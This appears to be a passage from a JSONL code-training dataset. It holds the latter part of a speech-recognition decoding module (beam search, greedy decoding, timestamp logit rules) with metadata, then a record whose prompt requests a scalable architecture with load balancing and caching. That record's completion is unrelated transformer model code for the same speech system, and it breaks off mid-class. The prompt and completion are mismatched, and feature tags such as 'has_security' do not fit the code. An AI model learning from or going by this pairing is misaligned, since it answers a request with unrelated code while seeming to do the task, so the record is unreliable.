hook.remove()\n\n        self.kv_cache = {}\n        self.hooks = []\n\n    def rearrange_kv_cache(self, source_indices):\n        if source_indices != list(range(len(source_indices))):\n            for module in self.kv_modules:\n                # update the key/value cache to contain the selected sequences\n                self.kv_cache[module] = self.kv_cache[module][source_indices].detach()\n\n\nclass SequenceRanker:\n    def rank(\n        self, tokens: List[List[Tensor]], sum_logprobs: List[List[float]]\n    ) -> List[int]:\n        \"\"\"\n        Given a list of groups of samples and their cumulative log probabilities,\n        return the indices of the samples in each group to select as the final result\n        \"\"\"\n        raise NotImplementedError\n\n\nclass MaximumLikelihoodRanker(SequenceRanker):\n    \"\"\"\n    Select the sample with the highest log probabilities, penalized using either\n    a simple length normalization or Google NMT paper's length penalty\n    \"\"\"\n\n    def __init__(self, length_penalty: Optional[float]):\n        self.length_penalty = length_penalty\n\n    def rank(self, tokens: List[List[Tensor]], sum_logprobs: List[List[float]]):\n        def scores(logprobs, lengths):\n            result = []\n            for logprob, length in zip(logprobs, lengths):\n                if self.length_penalty is None:\n                    penalty = length\n                else:\n                    # from the Google NMT paper\n                    penalty = ((5 + length) / 6) ** self.length_penalty\n                result.append(logprob / penalty)\n            return result\n\n        # get the sequence with the highest score\n        lengths = [[len(t) for t in s] for s in tokens]\n        return [np.argmax(scores(p, l)) for p, l in zip(sum_logprobs, lengths)]\n\n\nclass TokenDecoder:\n    def reset(self):\n        \"\"\"Initialize any stateful variables for decoding a new sequence\"\"\"\n\n    def update(\n        self, tokens: Tensor, logits: Tensor, sum_logprobs: Tensor\n    ) -> Tuple[Tensor, bool]:\n        \"\"\"Specify how to select the next token, based on the current trace and logits\n\n        Parameters\n        ----------\n        tokens : Tensor, shape = (n_batch, current_sequence_length)\n            all tokens in the context so far, including the prefix and sot_sequence tokens\n\n        logits : Tensor, shape = (n_batch, vocab_size)\n            per-token logits of the probability distribution at the current step\n\n        sum_logprobs : Tensor, shape = (n_batch)\n            cumulative log probabilities for each sequence\n\n        Returns\n        -------\n        tokens : Tensor, shape = (n_batch, current_sequence_length + 1)\n            the tokens, appended with the selected next token\n\n        completed : bool\n            True if all sequences has reached the end of text\n\n        \"\"\"\n        raise NotImplementedError\n\n    def finalize(\n        self, tokens: Tensor, sum_logprobs: Tensor\n    ) -> Tuple[Sequence[Sequence[Tensor]], List[List[float]]]:\n        \"\"\"Finalize search and return the final candidate sequences\n\n        Parameters\n        ----------\n        tokens : Tensor, shape = (n_audio, n_group, current_sequence_length)\n            all tokens in the context so far, including the prefix and sot_sequence\n\n        sum_logprobs : Tensor, shape = (n_audio, n_group)\n            cumulative log probabilities for each sequence\n\n        Returns\n        -------\n        tokens : Sequence[Sequence[Tensor]], length = n_audio\n            sequence of Tensors containing candidate token sequences, for each audio input\n\n        sum_logprobs : List[List[float]], length = n_audio\n            sequence of cumulative log probabilities corresponding to the above\n\n        \"\"\"\n        raise NotImplementedError\n\n\nclass GreedyDecoder(TokenDecoder):\n    def __init__(self, temperature: float, eot: int):\n        self.temperature = temperature\n        self.eot = eot\n\n    def update(\n        self, tokens: Tensor, logits: Tensor, sum_logprobs: Tensor\n    ) -> Tuple[Tensor, bool]:\n        if self.temperature == 0:\n            next_tokens = logits.argmax(dim=-1)\n        else:\n            next_tokens = Categorical(logits=logits / self.temperature).sample()\n\n        logprobs = F.log_softmax(logits.float(), dim=-1)\n        current_logprobs = logprobs[torch.arange(logprobs.shape[0]), next_tokens]\n        sum_logprobs += current_logprobs * (tokens[:, -1] != self.eot)\n\n        next_tokens[tokens[:, -1] == self.eot] = self.eot\n        tokens = torch.cat([tokens, next_tokens[:, None]], dim=-1)\n\n        completed = (tokens[:, -1] == self.eot).all()\n        return tokens, completed\n\n    def finalize(self, tokens: Tensor, sum_logprobs: Tensor):\n        # make sure each sequence has at least one EOT token at the end\n        tokens = F.pad(tokens, (0, 1), value=self.eot)\n        return tokens, sum_logprobs.tolist()\n\n\nclass BeamSearchDecoder(TokenDecoder):\n    def __init__(\n        self,\n        beam_size: int,\n        eot: int,\n        inference: Inference,\n        patience: Optional[float] = None,\n    ):\n        self.beam_size = beam_size\n        self.eot = eot\n        self.inference = inference\n        self.patience = patience or 1.0\n        self.max_candidates: int = round(beam_size * self.patience)\n        self.finished_sequences = None\n\n        assert (\n            self.max_candidates > 0\n        ), f\"Invalid beam size ({beam_size}) or patience ({patience})\"\n\n    def reset(self):\n        self.finished_sequences = None\n\n    def update(\n        self, tokens: Tensor, logits: Tensor, sum_logprobs: Tensor\n    ) -> Tuple[Tensor, bool]:\n        if tokens.shape[0] % self.beam_size != 0:\n            raise ValueError(f\"{tokens.shape}[0] % {self.beam_size} != 0\")\n\n        n_audio = tokens.shape[0] // self.beam_size\n        if self.finished_sequences is None:  # for the first update\n            self.finished_sequences = [{} for _ in range(n_audio)]\n\n        logprobs = F.log_softmax(logits.float(), dim=-1)\n        next_tokens, source_indices, finished_sequences = [], [], []\n        for i in range(n_audio):\n            scores, sources, finished = {}, {}, {}\n\n            # STEP 1: calculate the cumulative log probabilities for possible candidates\n            for j in range(self.beam_size):\n                idx = i * self.beam_size + j\n                prefix = tokens[idx].tolist()\n                for logprob, token in zip(*logprobs[idx].topk(self.beam_size + 1)):\n                    new_logprob = (sum_logprobs[idx] + logprob).item()\n                    sequence = tuple(prefix + [token.item()])\n                    scores[sequence] = new_logprob\n                    sources[sequence] = idx\n\n            # STEP 2: rank the candidates and keep the top beam_size sequences for each audio\n            saved = 0\n            for sequence in sorted(scores, key=scores.get, reverse=True):\n                if sequence[-1] == self.eot:\n                    finished[sequence] = scores[sequence]\n                else:\n                    sum_logprobs[len(next_tokens)] = scores[sequence]\n                    next_tokens.append(sequence)\n                    source_indices.append(sources[sequence])\n\n                    saved += 1\n                    if saved == self.beam_size:\n                        break\n\n            finished_sequences.append(finished)\n\n        tokens = torch.tensor(next_tokens, device=tokens.device)\n        self.inference.rearrange_kv_cache(source_indices)\n\n        # add newly finished sequences to self.finished_sequences\n        assert len(self.finished_sequences) == len(finished_sequences)\n        for previously_finished, newly_finished in zip(\n            self.finished_sequences, finished_sequences\n        ):\n            for seq in sorted(newly_finished, key=newly_finished.get, reverse=True):\n                if len(previously_finished) >= self.max_candidates:\n                    break  # the candidate list is full\n                previously_finished[seq] = newly_finished[seq]\n\n        # mark as completed if all audio has enough number of samples\n        completed = all(\n            len(sequences) >= self.max_candidates\n            for sequences in self.finished_sequences\n        )\n        return tokens, completed\n\n    def finalize(self, preceding_tokens: Tensor, sum_logprobs: Tensor):\n        # collect all finished sequences, including patience, and add unfinished ones if not enough\n        sum_logprobs = sum_logprobs.cpu()\n        for i, sequences in enumerate(self.finished_sequences):\n            if (\n                len(sequences) < self.beam_size\n            ):  # when not enough sequences are finished\n                for j in list(np.argsort(sum_logprobs[i]))[::-1]:\n                    sequence = preceding_tokens[i, j].tolist() + [self.eot]\n                    sequences[tuple(sequence)] = sum_logprobs[i][j].item()\n                    if len(sequences) >= self.beam_size:\n                        break\n\n        tokens: List[List[Tensor]] = [\n            [torch.tensor(seq) for seq in sequences.keys()]\n            for sequences in self.finished_sequences\n        ]\n        sum_logprobs: List[List[float]] = [\n            list(sequences.values()) for sequences in self.finished_sequences\n        ]\n        return tokens, sum_logprobs\n\n\nclass LogitFilter:\n    def apply(self, logits: Tensor, tokens: Tensor) -> None:\n        \"\"\"Apply any filtering or masking to logits in-place\n\n        Parameters\n        ----------\n        logits : Tensor, shape = (n_batch, vocab_size)\n            per-token logits of the probability distribution at the current step\n\n        tokens : Tensor, shape = (n_batch, current_sequence_length)\n            all tokens in the context so far, including the prefix and sot_sequence tokens\n\n        \"\"\"\n        raise NotImplementedError\n\n\nclass SuppressBlank(LogitFilter):\n    def __init__(self, tokenizer: Tokenizer, sample_begin: int):\n        self.tokenizer = tokenizer\n        self.sample_begin = sample_begin\n\n    def apply(self, logits: Tensor, tokens: Tensor):\n        if tokens.shape[1] == self.sample_begin:\n            logits[:, self.tokenizer.encode(\" \") + [self.tokenizer.eot]] = -np.inf\n\n\nclass SuppressTokens(LogitFilter):\n    def __init__(self, suppress_tokens: Sequence[int]):\n        self.suppress_tokens = list(suppress_tokens)\n\n    def apply(self, logits: Tensor, tokens: Tensor):\n        logits[:, self.suppress_tokens] = -np.inf\n\n\nclass ApplyTimestampRules(LogitFilter):\n    def __init__(\n        self,\n        tokenizer: Tokenizer,\n        sample_begin: int,\n        max_initial_timestamp_index: Optional[int],\n    ):\n        self.tokenizer = tokenizer\n        self.sample_begin = sample_begin\n        self.max_initial_timestamp_index = max_initial_timestamp_index\n\n    def apply(self, logits: Tensor, tokens: Tensor):\n        # suppress <|notimestamps|> which is handled by without_timestamps\n        if self.tokenizer.no_timestamps is not None:\n            logits[:, self.tokenizer.no_timestamps] = -np.inf\n\n        # timestamps have to appear in pairs, except directly before EOT; mask logits accordingly\n        for k in range(tokens.shape[0]):\n            sampled_tokens = tokens[k, self.sample_begin :]\n            seq = [t for t in sampled_tokens.tolist()]\n            last_was_timestamp = (\n                len(seq) >= 1 and seq[-1] >= self.tokenizer.timestamp_begin\n            )\n            penultimate_was_timestamp = (\n                len(seq) < 2 or seq[-2] >= self.tokenizer.timestamp_begin\n            )\n\n            if last_was_timestamp:\n                if penultimate_was_timestamp:  # has to be non-timestamp\n                    logits[k, self.tokenizer.timestamp_begin :] = -np.inf\n                else:  # cannot be normal text tokens\n                    logits[k, : self.tokenizer.eot] = -np.inf\n\n            timestamps = sampled_tokens[\n                sampled_tokens.ge(self.tokenizer.timestamp_begin)\n            ]\n            if timestamps.numel() > 0:\n                # timestamps shouldn't decrease; forbid timestamp tokens smaller than the last\n                # also force each segment to have a nonzero length, to prevent infinite looping\n                if last_was_timestamp and not penultimate_was_timestamp:\n                    timestamp_last = timestamps[-1]\n                else:\n                    timestamp_last = timestamps[-1] + 1\n                logits[k, self.tokenizer.timestamp_begin : timestamp_last] = -np.inf\n\n        if tokens.shape[1] == self.sample_begin:\n            # suppress generating non-timestamp tokens at the beginning\n            logits[:, : self.tokenizer.timestamp_begin] = -np.inf\n\n            # apply the `max_initial_timestamp` option\n            if self.max_initial_timestamp_index is not None:\n                last_allowed = (\n                    self.tokenizer.timestamp_begin + self.max_initial_timestamp_index\n                )\n                logits[:, last_allowed + 1 :] = -np.inf\n\n        # if sum of probability over timestamps is above any other token, sample timestamp\n        logprobs = F.log_softmax(logits.float(), dim=-1)\n        for k in range(tokens.shape[0]):\n            timestamp_logprob = logprobs[k, self.tokenizer.timestamp_begin :].logsumexp(\n                dim=-1\n            )\n            max_text_token_logprob = logprobs[k, : self.tokenizer.timestamp_begin].max()\n            if timestamp_logprob > max_text_token_logprob:\n                logits[k, : self.tokenizer.timestamp_begin] = -np.inf\n\n\nclass DecodingTask:\n    inference: Inference\n    sequence_ranker: SequenceRanker\n    decoder: TokenDecoder\n    logit_filters: List[LogitFilter]\n\n    def __init__(self, model: \"Whisper\", options: DecodingOptions):\n        self.model = model\n\n        language = options.language or \"en\"\n        tokenizer = get_tokenizer(\n            model.is_multilingual,\n            num_languages=model.num_languages,\n            language=language,\n            task=options.task,\n        )\n        self.tokenizer: Tokenizer = tokenizer\n        self.options: DecodingOptions = self._verify_options(options)\n\n        self.n_group: int = options.beam_size or options.best_of or 1\n        self.n_ctx: int = model.dims.n_text_ctx\n        self.sample_len: int = options.sample_len or model.dims.n_text_ctx // 2\n\n        self.sot_sequence: Tuple[int] = tokenizer.sot_sequence\n        if self.options.without_timestamps:\n            self.sot_sequence = tokenizer.sot_sequence_including_notimestamps\n\n        self.initial_tokens: Tuple[int] = self._get_initial_tokens()\n        self.sample_begin: int = len(self.initial_tokens)\n        self.sot_index: int = self.initial_tokens.index(tokenizer.sot)\n\n        # inference: implements the forward pass through the decoder, including kv caching\n        self.inference = PyTorchInference(model, len(self.initial_tokens))\n\n        # sequence ranker: implements how to rank a group of sampled sequences\n        self.sequence_ranker = MaximumLikelihoodRanker(options.length_penalty)\n\n        # decoder: implements how to select the next tokens, given the autoregressive distribution\n        if options.beam_size is not None:\n            self.decoder = BeamSearchDecoder(\n                options.beam_size, tokenizer.eot, self.inference, options.patience\n            )\n        else:\n            self.decoder = GreedyDecoder(options.temperature, tokenizer.eot)\n\n        # logit filters: applies various rules to suppress or penalize certain tokens\n        self.logit_filters = []\n        if self.options.suppress_blank:\n            self.logit_filters.append(SuppressBlank(self.tokenizer, self.sample_begin))\n        if self.options.suppress_tokens:\n            self.logit_filters.append(SuppressTokens(self._get_suppress_tokens()))\n        if not options.without_timestamps:\n            precision = CHUNK_LENGTH / model.dims.n_audio_ctx  # usually 0.02 seconds\n            max_initial_timestamp_index = None\n            if options.max_initial_timestamp:\n                max_initial_timestamp_index = round(\n                    self.options.max_initial_timestamp / precision\n                )\n            self.logit_filters.append(\n                ApplyTimestampRules(\n                    tokenizer, self.sample_begin, max_initial_timestamp_index\n                )\n            )\n\n    def _verify_options(self, options: DecodingOptions) -> DecodingOptions:\n        if options.beam_size is not None and options.best_of is not None:\n            raise ValueError(\"beam_size and best_of can't be given together\")\n        if options.temperature == 0:\n            if options.best_of is not None:\n                raise ValueError(\"best_of with greedy sampling (T=0) is not compatible\")\n        if options.patience is not None and options.beam_size is None:\n            raise ValueError(\"patience requires beam_size to be given\")\n        if options.length_penalty is not None and not (\n            0 <= options.length_penalty <= 1\n        ):\n            raise ValueError(\"length_penalty (alpha) should be a value between 0 and 1\")\n\n        return options\n\n    def _get_initial_tokens(self) -> Tuple[int]:\n        tokens = list(self.sot_sequence)\n\n        if prefix := self.options.prefix:\n            prefix_tokens = (\n                self.tokenizer.encode(\" \" + prefix.strip())\n                if isinstance(prefix, str)\n                else prefix\n            )\n            if self.sample_len is not None:\n                max_prefix_len = self.n_ctx // 2 - self.sample_len\n                prefix_tokens = prefix_tokens[-max_prefix_len:]\n            tokens = tokens + prefix_tokens\n\n        if prompt := self.options.prompt:\n            prompt_tokens = (\n                self.tokenizer.encode(\" \" + prompt.strip())\n                if isinstance(prompt, str)\n                else prompt\n            )\n            tokens = (\n                [self.tokenizer.sot_prev]\n                + prompt_tokens[-(self.n_ctx // 2 - 1) :]\n                + tokens\n            )\n\n        return tuple(tokens)\n\n    def _get_suppress_tokens(self) -> Tuple[int]:\n        suppress_tokens = self.options.suppress_tokens\n\n        if isinstance(suppress_tokens, str):\n            suppress_tokens = [int(t) for t in suppress_tokens.split(\",\")]\n\n        if -1 in suppress_tokens:\n            suppress_tokens = [t for t in suppress_tokens if t >= 0]\n            suppress_tokens.extend(self.tokenizer.non_speech_tokens)\n        elif suppress_tokens is None or len(suppress_tokens) == 0:\n            suppress_tokens = []  # interpret empty string as an empty list\n        else:\n            assert isinstance(suppress_tokens, list), \"suppress_tokens must be a list\"\n\n        suppress_tokens.extend(\n            [\n                self.tokenizer.transcribe,\n                self.tokenizer.translate,\n                self.tokenizer.sot,\n                self.tokenizer.sot_prev,\n                self.tokenizer.sot_lm,\n            ]\n        )\n        if self.tokenizer.no_speech is not None:\n            # no-speech probability is collected separately\n            suppress_tokens.append(self.tokenizer.no_speech)\n\n        return tuple(sorted(set(suppress_tokens)))\n\n    def _get_audio_features(self, mel: Tensor):\n        if self.options.fp16:\n            mel = mel.half()\n\n        if mel.shape[-2:] == (\n            self.model.dims.n_audio_ctx,\n            self.model.dims.n_audio_state,\n        ):\n            # encoded audio features are given; skip audio encoding\n            audio_features = mel\n        else:\n            audio_features = self.model.encoder(mel)\n\n        if audio_features.dtype != (\n            torch.float16 if self.options.fp16 else torch.float32\n        ):\n            return TypeError(\n                f\"audio_features has an incorrect dtype: {audio_features.dtype}\"\n            )\n\n        return audio_features\n\n    def _detect_language(self, audio_features: Tensor, tokens: Tensor):\n        languages = [self.options.language] * audio_features.shape[0]\n        lang_probs = None\n\n        if self.options.language is None or self.options.task == \"lang_id\":\n            lang_tokens, lang_probs = self.model.detect_language(\n                audio_features, self.tokenizer\n            )\n            languages = [max(probs, key=probs.get) for probs in lang_probs]\n            if self.options.language is None:\n                tokens[:, self.sot_index + 1] = lang_tokens  # write language tokens\n\n        return languages, lang_probs\n\n    def _main_loop(self, audio_features: Tensor, tokens: Tensor):\n        n_batch = tokens.shape[0]\n        sum_logprobs: Tensor = torch.zeros(n_batch, device=audio_features.device)\n        no_speech_probs = [np.nan] * n_batch\n\n        try:\n            for i in range(self.sample_len):\n                logits = self.inference.logits(tokens, audio_features)\n\n                if (\n                    i == 0 and self.tokenizer.no_speech is not None\n                ):  # save no_speech_probs\n                    probs_at_sot = logits[:, self.sot_index].float().softmax(dim=-1)\n                    no_speech_probs = probs_at_sot[:, self.tokenizer.no_speech].tolist()\n\n                # now we need to consider the logits at the last token only\n                logits = logits[:, -1]\n\n                # apply the logit filters, e.g. for suppressing or applying penalty to\n                for logit_filter in self.logit_filters:\n                    logit_filter.apply(logits, tokens)\n\n                # expand the tokens tensor with the selected next tokens\n                tokens, completed = self.decoder.update(tokens, logits, sum_logprobs)\n\n                if completed or tokens.shape[-1] > self.n_ctx:\n                    break\n        finally:\n            self.inference.cleanup_caching()\n\n        return tokens, sum_logprobs, no_speech_probs\n\n    @torch.no_grad()\n    def run(self, mel: Tensor) -> List[DecodingResult]:\n        self.decoder.reset()\n        tokenizer: Tokenizer = self.tokenizer\n        n_audio: int = mel.shape[0]\n\n        audio_features: Tensor = self._get_audio_features(mel)  # encoder forward pass\n        tokens: Tensor = torch.tensor([self.initial_tokens]).repeat(n_audio, 1)\n\n        # detect language if requested, overwriting the language token\n        languages, language_probs = self._detect_language(audio_features, tokens)\n        if self.options.task == \"lang_id\":\n            return [\n                DecodingResult(\n                    audio_features=features, language=language, language_probs=probs\n                )\n                for features, language, probs in zip(\n                    audio_features, languages, language_probs\n                )\n            ]\n\n        # repeat text tensors by the group size, for beam search or best-of-n sampling\n        tokens = tokens.repeat_interleave(self.n_group, dim=0).to(audio_features.device)\n\n        # call the main sampling loop\n        tokens, sum_logprobs, no_speech_probs = self._main_loop(audio_features, tokens)\n\n        # reshape the tensors to have (n_audio, n_group) as the first two dimensions\n        audio_features = audio_features[:: self.n_group]\n        no_speech_probs = no_speech_probs[:: self.n_group]\n        assert audio_features.shape[0] == len(no_speech_probs) == n_audio\n\n        tokens = tokens.reshape(n_audio, self.n_group, -1)\n        sum_logprobs = sum_logprobs.reshape(n_audio, self.n_group)\n\n        # get the final candidates for each group, and slice between the first sampled token and EOT\n        tokens, sum_logprobs = self.decoder.finalize(tokens, sum_logprobs)\n        tokens: List[List[Tensor]] = [\n            [t[self.sample_begin : (t == tokenizer.eot).nonzero()[0, 0]] for t in s]\n            for s in tokens\n        ]\n\n        # select the top-ranked sample in each group\n        selected = self.sequence_ranker.rank(tokens, sum_logprobs)\n        tokens: List[List[int]] = [t[i].tolist() for i, t in zip(selected, tokens)]\n        texts: List[str] = [tokenizer.decode(t).strip() for t in tokens]\n\n        sum_logprobs: List[float] = [lp[i] for i, lp in zip(selected, sum_logprobs)]\n        avg_logprobs: List[float] = [\n            lp / (len(t) + 1) for t, lp in zip(tokens, sum_logprobs)\n        ]\n\n        fields = (\n            texts,\n            languages,\n            tokens,\n            audio_features,\n            avg_logprobs,\n            no_speech_probs,\n        )\n        if len(set(map(len, fields))) != 1:\n            raise RuntimeError(f\"inconsistent result lengths: {list(map(len, fields))}\")\n\n        return [\n            DecodingResult(\n                audio_features=features,\n                language=language,\n                tokens=tokens,\n                text=text,\n                avg_logprob=avg_logprob,\n                no_speech_prob=no_speech_prob,\n                temperature=self.options.temperature,\n                compression_ratio=compression_ratio(text),\n            )\n            for text, language, tokens, features, avg_logprob, no_speech_prob in zip(\n                *fields\n            )\n        ]\n\n\n@torch.no_grad()\ndef decode(\n    model: \"Whisper\",\n    mel: Tensor,\n    options: DecodingOptions = DecodingOptions(),\n    **kwargs,\n) -> Union[DecodingResult, List[DecodingResult]]:\n    \"\"\"\n    Performs decoding of 30-second audio segment(s), provided as Mel spectrogram(s).\n\n    Parameters\n    ----------\n    model: Whisper\n        the Whisper model instance\n\n    mel: torch.Tensor, shape = (80, 3000) or (*, 80, 3000)\n        A tensor containing the Mel spectrogram(s)\n\n    options: DecodingOptions\n        A dataclass that contains all necessary options for decoding 30-second segments\n\n    Returns\n    -------\n    result: Union[DecodingResult, List[DecodingResult]]\n        The result(s) of decoding contained in `DecodingResult` dataclass instance(s)\n    \"\"\"\n    if single := mel.ndim == 2:\n        mel = mel.unsqueeze(0)\n\n    if kwargs:\n        options = replace(options, **kwargs)\n\n    result = DecodingTask(model, options).run(mel)\n\n    return result[0] if single else result\n", "metadata": {"source": "github.com/openai/whisper", "file_path": "whisper/decoding.py", "language": "python", "complexity": "complex", "star_count": 85533, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 827}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import base64\nimport gzip\nfrom contextlib import contextmanager\nfrom dataclasses import dataclass\nfrom typing import Dict, Iterable, Optional, Tuple\n\nimport numpy as np\nimport torch\nimport torch.nn.functional as F\nfrom torch import Tensor, nn\n\nfrom .decoding import decode as decode_function\nfrom .decoding import detect_language as detect_language_function\nfrom .transcribe import transcribe as transcribe_function\n\ntry:\n    from torch.nn.functional import scaled_dot_product_attention\n\n    SDPA_AVAILABLE = True\nexcept (ImportError, RuntimeError, OSError):\n    scaled_dot_product_attention = None\n    SDPA_AVAILABLE = False\n\n\n@dataclass\nclass ModelDimensions:\n    n_mels: int\n    n_audio_ctx: int\n    n_audio_state: int\n    n_audio_head: int\n    n_audio_layer: int\n    n_vocab: int\n    n_text_ctx: int\n    n_text_state: int\n    n_text_head: int\n    n_text_layer: int\n\n\nclass LayerNorm(nn.LayerNorm):\n    def forward(self, x: Tensor) -> Tensor:\n        return super().forward(x.float()).type(x.dtype)\n\n\nclass Linear(nn.Linear):\n    def forward(self, x: Tensor) -> Tensor:\n        return F.linear(\n            x,\n            self.weight.to(x.dtype),\n            None if self.bias is None else self.bias.to(x.dtype),\n        )\n\n\nclass Conv1d(nn.Conv1d):\n    def _conv_forward(\n        self, x: Tensor, weight: Tensor, bias: Optional[Tensor]\n    ) -> Tensor:\n        return super()._conv_forward(\n            x, weight.to(x.dtype), None if bias is None else bias.to(x.dtype)\n        )\n\n\ndef sinusoids(length, channels, max_timescale=10000):\n    \"\"\"Returns sinusoids for positional embedding\"\"\"\n    assert channels % 2 == 0\n    log_timescale_increment = np.log(max_timescale) / (channels // 2 - 1)\n    inv_timescales = torch.exp(-log_timescale_increment * torch.arange(channels // 2))\n    scaled_time = torch.arange(length)[:, np.newaxis] * inv_timescales[np.newaxis, :]\n    return torch.cat([torch.sin(scaled_time), torch.cos(scaled_time)], dim=1)\n\n\n@contextmanager\ndef disable_sdpa():\n    prev_state = MultiHeadAttention.use_sdpa\n    try:\n        MultiHeadAttention.use_sdpa = False\n        yield\n    finally:\n        MultiHeadAttention.use_sdpa = prev_state\n\n\nclass MultiHeadAttention(nn.Module):\n    use_sdpa = True\n\n    def __init__(self, n_state: int, n_head: int):\n        super().__init__()\n        self.n_head = n_head\n        self.query = Linear(n_state, n_state)\n        self.key = Linear(n_state, n_state, bias=False)\n        self.value = Linear(n_state, n_state)\n        self.out = Linear(n_state, n_state)\n\n    def forward(\n        self,\n        x: Tensor,\n        xa: Optional[Tensor] = None,\n        mask: Optional[Tensor] = None,\n        kv_cache: Optional[dict] = None,\n    ):\n        q = self.query(x)\n\n        if kv_cache is None or xa is None or self.key not in kv_cache:\n            # hooks, if installed (i.e. kv_cache is not None), will prepend the cached kv tensors;\n            # otherwise, perform key/value projections for self- or cross-attention as usual.\n            k = self.key(x if xa is None else xa)\n            v = self.value(x if xa is None else xa)\n        else:\n            # for cross-attention, calculate keys and values once and reuse in subsequent calls.\n            k = kv_cache[self.key]\n            v = kv_cache[self.value]\n\n        wv, qk = self.qkv_attention(q, k, v, mask)\n        return self.out(wv), qk\n\n    def qkv_attention(\n        self, q: Tensor, k: Tensor, v: Tensor, mask: Optional[Tensor] = None\n    ) -> Tuple[torch.Tensor, Optional[torch.Tensor]]:\n        n_batch, n_ctx, n_state = q.shape\n        scale = (n_state // self.n_head) ** -0.25\n        q = q.view(*q.shape[:2], self.n_head, -1).permute(0, 2, 1, 3)\n        k = k.view(*k.shape[:2], self.n_head, -1).permute(0, 2, 1, 3)\n        v = v.view(*v.shape[:2], self.n_head, -1).permute(0, 2, 1, 3)\n\n        if SDPA_AVAILABLE and MultiHeadAttention.use_sdpa:\n            a = scaled_dot_product_attention(\n                q, k, v, is_causal=mask is not None and n_ctx > 1\n            )\n            out = a.permute(0, 2, 1, 3).flatten(start_dim=2)\n            qk = None\n        else:\n            qk = (q * scale) @ (k * scale).transpose(-1, -2)\n            if mask is not None:\n                qk = qk + mask[:n_ctx, :n_ctx]\n            qk = qk.float()\n\n            w = F.softmax(qk, dim=-1).to(q.dtype)\n            out = (w @ v).permute(0, 2, 1, 3).flatten(start_dim=2)\n            qk = qk.detach()\n\n        return out, qk\n\n\nclass ResidualAttentionBlock(nn.Module):\n    def __init__(self, n_state: int, n_head: int, cross_attention: bool = False):\n        super().__init__()\n\n        self.attn = MultiHeadAttention(n_state, n_head)\n        self.attn_ln = LayerNorm(n_state)\n\n        self.cross_attn = (\n            MultiHeadAttention(n_state, n_head) if cross_attention else None\n        )\n        self.cross_attn_ln = LayerNorm(n_state) if cross_attention else None\n\n        n_mlp = n_state * 4\n        self.mlp = nn.Sequential(\n            Linear(n_state, n_mlp), nn.GELU(), Linear(n_mlp, n_state)\n        )\n        self.mlp_ln = LayerNorm(n_state)\n\n    def forward(\n        self,\n        x: Tensor,\n        xa: Optional[Tensor] = None,\n        mask: Optional[Tensor] = None,\n        kv_cache: Optional[dict] = None,\n    ):\n        x = x + self.attn(self.attn_ln(x), mask=mask, kv_cache=kv_cache)[0]\n        if self.cross_attn:\n            x = x + self.cross_attn(self.cross_attn_ln(x), xa, kv_cache=kv_cache)[0]\n        x = x + self.mlp(self.mlp_ln(x))\n        return x\n\n\nclass AudioEncoder(nn.Module):\n    def __init__(\n        self, n_mels: int, n_ctx: int, n_state: int, n_head: int, n_layer: int\n    ):\n        super().__init__()\n        self.conv1 = Conv1d(n_mels, n_state, kernel_size=3, padding=1)\n        self.conv2 = Conv1d(n_state, n_state, kernel_size=3, stride=2, padding=1)\n        self.register_buffer(\"positional_embedding\", sinusoids(n_ctx, n_state))\n\n        self.blocks: Iterable[ResidualAttentionBlock] = nn.ModuleList(\n            [ResidualAttentionBlock(n_state, n_head) for _ in range(n_layer)]\n        )\n        self.ln_post = LayerNorm(n_state)\n\n    def forward(self, x: Tensor):\n        \"\"\"\n        x : torch.Tensor, shape = (batch_size, n_mels, n_ctx)\n            the mel spectrogram of the audio\n        \"\"\"\n        x = F.gelu(self.conv1(x))\n        x = F.gelu(self.conv2(x))\n        x = x.permute(0, 2, 1)\n\n        assert x.shape[1:] == self.positional_embedding.shape, \"incorrect audio shape\"\n        x = (x + self.positional_embedding).to(x.dtype)\n\n        for block in self.blocks:\n            x = block(x)\n\n        x = self.ln_post(x)\n        return x\n\n\nclass TextDecoder(nn.Module):\n    def __init__(\n        self, n_vocab: int, n_ctx: int, n_state: int, n_head: int, n_layer: int\n    ):\n        super().__init__()\n\n        self.token_embedding = nn.Embedding(n_vocab, n_state)\n        self.positional_embedding = nn.Parameter(torch.empty(n_ctx, n_state))\n\n        self.blocks: Iterable[ResidualAttentionBlock] = nn.ModuleList(\n            [\n                ResidualAttentionBlock(n_state, n_head, cross_attention=True)\n                for _ in range(n_layer)\n            ]\n        )\n        self.ln = LayerNorm(n_state)\n\n        mask = torch.empty(n_ctx, n_ctx).fill_(-np.inf).triu_(1)\n        self.register_buffer(\"mask\", mask, persistent=False)\n\n    def forward(self, x: Tensor, xa: Tensor, kv_cache: Optional[dict] = None):\n        \"\"\"\n        x : torch.LongTensor, shape = (batch_size, <= n_ctx)\n            the text tokens\n        xa : torch.Tensor, shape = (batch_size, n_audio_ctx, n_audio_state)\n            the encoded audio features to be attended on\n        \"\"\"\n        offset = next(iter(kv_cache.values())).shape[1] if kv_cache else 0\n        x = (\n            self.token_embedding(x)\n            + self.positional_embedding[offset : offset + x.shape[-1]]\n        )\n        x = x.to(xa.dtype)\n\n        for block in self.blocks:\n            x = block(x, xa, mask=self.mask, kv_cache=kv_cache)\n\n        x = self.ln(x)\n        logits = (\n            x @ torch.transpose(self.token_embedding.weight.to(x.dtype), 0, 1)\n        ).float()\n\n        return logits\n\n\nclass Whisper(nn.Module):\n    def __init__(self, dims: ModelDimensions):\n        super().__init__()\n        self.dims = dims\n        self.encoder = AudioEncoder(\n            self.dims.n_mels,\n            self.dims.n_audio_ctx,\n            self.dims.n_audio_state,\n            self.dims.n_audio_head,\n            self.dims.n_audio_layer,\n        )\n        self.decoder = TextDecoder(\n            self.dims.n_vocab,\n            self.dims.n_text_ctx,\n            self.dims.n_text_state,\n            self.dims.n_text_head,\n            self.dims.n_text_layer,\n        )\n        # use the last half among the decoder layers for time alignment by default;\n        # to use a specific set of heads, see `set_alignment_heads()` below.\n        all_heads = torch.zeros(\n            self.dims.n_text_layer, self.dims.n_text_head, dtype=torch.bool\n        )\n        all_heads[self.dims.n_text_layer // 2 :] = True\n        self.register_buffer(\"alignment_heads\", all_heads.to_sparse(), persistent=False)\n\n    